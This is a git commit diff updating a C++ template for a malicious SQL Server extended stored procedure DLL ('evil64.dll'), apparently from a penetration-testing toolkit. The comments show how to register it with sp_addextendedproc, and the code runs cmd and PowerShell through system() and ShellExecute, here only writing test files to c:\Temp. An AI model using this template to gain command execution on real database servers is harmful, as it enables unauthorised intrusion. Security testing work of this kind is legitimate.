30b6e47f75e5d40ab91dc1a7dccc186ed61ea509
Scott Sutherland <scott.sutherland@nullbind.com>
2016-03-15 21:20:57 -0500

    Update xp_cmd_template.cpp

--- Stable-ish/MSSQL/xp_cmd_template.cpp
+++ Stable-ish/MSSQL/xp_cmd_template.cpp
@@ -5,19 +5,15 @@
 // rundll32 evil64.dll,RunCmd
 // sp_addextendedproc 'RunCmd', 'c:\Temp\evil64.dll';
 // RunCmd
-//DllMain.cpp
+// DllMain.cpp
 
-#include "stdafx.h"			// dllmain.cpp : Defines the entry point for the DLL application.
+#include "stdafx.h"			//dllmain.cpp : Defines the entry point for the DLL application.
 #include "srv.h"			//Must get from C:\Program Files (x86)\Microsoft SQL Server\80\Tools\DevTools\Include            
-#include "shellapi.h"			//need for ShellExecute          
-#include "string"			//needed for std:string         
-#include <sys/stat.h>			//need for stat in fileExists function below  
+#include "shellapi.h"		//needed for ShellExecute          
+#include "string"			//needed for std:string          
 
-BOOL APIENTRY DllMain( HMODULE hModule,
-                       DWORD  ul_reason_for_call,
-                       LPVOID lpReserved
-					 )
-{
+BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved){
+
 	switch (ul_reason_for_call)
 	{
 	case DLL_PROCESS_ATTACH:
@@ -29,11 +25,18 @@ BOOL APIENTRY DllMain( HMODULE hModule,
 	return TRUE;
 }
 
-#define DLL_FUNC extern "C" __declspec (dllexport)          
+#define DLL_FUNC extern "C" __declspec (dllexport)     
 
-DLL_FUNC int __stdcall RunCmd() {
-	
+DLL_FUNC int __stdcall RunCmd(const char * MyCmd) {
+
+	// Run OS command
+	system("echo hello > c:\\Temp\\stuff.txt");
 	ShellExecute(NULL, TEXT("open"), TEXT("cmd"), TEXT(" /C echo hello > c:\\Temp\\evil1_cmd.txt"), TEXT(" C:\\ "), SW_SHOW);
+
+	// Run PowerShell command
+	system("echo hello > c:\\Temp\\stuff.txt");
 	ShellExecute(NULL, TEXT("open"), TEXT("powershell"), TEXT(" -C \" 'test'|out-file c:\\temp\\evil2_ps.txt \" "), TEXT(" C:\\ "), SW_SHOW);
-	return 0;
+
+	return 1;
 }
+
